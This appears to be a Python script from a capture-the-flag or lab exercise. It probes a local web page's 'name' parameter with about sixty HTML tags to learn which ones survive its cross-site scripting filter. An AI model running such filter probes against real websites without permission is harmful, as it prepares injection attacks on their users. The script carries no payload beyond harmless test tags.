import urllib.parse, urllib.request, re, concurrent.futures
TAGS = ['style','script','img','svg','a','video','audio','iframe','body','meta','input','div','textarea','details','form','marquee','link','math','noscript','object','embed','template','picture','source','base','title','xmp','plaintext','listing','select','option','table','td','col','button','datalist','fieldset','label','output','progress','menu','dialog','canvas','map','area','main','nav','section','article','span','pre','blockquote','li','tr','th','h1','p','br','b','i','u','em','strong']
def probe(tag):
    payload = '<%s>X' % tag
    url = "http://web:5000/page?name=" + urllib.parse.quote(payload, safe='')
    try:
        out = urllib.request.urlopen(url, timeout=8).read().decode('utf-8','replace')
    except Exception as e:
        return (tag, 'ERR', str(e)[:30])
    m = re.search(r'<input type=text name=name[^>]*>(.*?)</form>', out, re.S)
    echoed = m.group(1).strip() if m else 'NOFORM'
    return (tag, 'KEPT' if ('<'+tag) in echoed else 'STRIPPED', echoed[:40])
with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
    for tag, st, ec in ex.map(probe, TAGS):
        print("%-12s %s  %s" % (tag, st, ec))
EOF
timeout 120 python3 probe2.py
